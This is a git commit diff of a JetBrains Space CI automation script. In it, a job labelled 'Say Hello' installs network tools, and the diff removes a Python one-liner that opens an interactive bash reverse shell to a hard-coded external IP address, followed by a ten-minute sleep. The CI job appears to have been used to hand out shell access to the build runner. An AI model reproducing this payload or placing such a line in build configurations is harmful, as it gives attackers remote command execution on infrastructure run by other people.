a757decb94a5e9f57223d9100e4e1d45da34d308
python cloudspace <cs4python@gmail.com>
2022-08-31 12:00:19 +0000

    hllo

--- .space.kts
+++ .space.kts
@@ -4,9 +4,8 @@
 * For more info, see https://www.jetbrains.com/help/space/automation.html
 */
 
-
-job("ttt") {
-    container(displayName = "Say Hello ttt", image = "ubuntu") {
+job("shell script") {
+    container(displayName = "Say Hello", image = "ubuntu") {
         shellScript {
             content = """
                 echo Hello
@@ -14,8 +13,6 @@ job("ttt") {
                 pwd
                 whoami
                 apt update -y  && apt install curl tmux sudo wget socat -y 
-                python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('159.75.14.198',80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
-				sleep 600              
             """
         }
     }
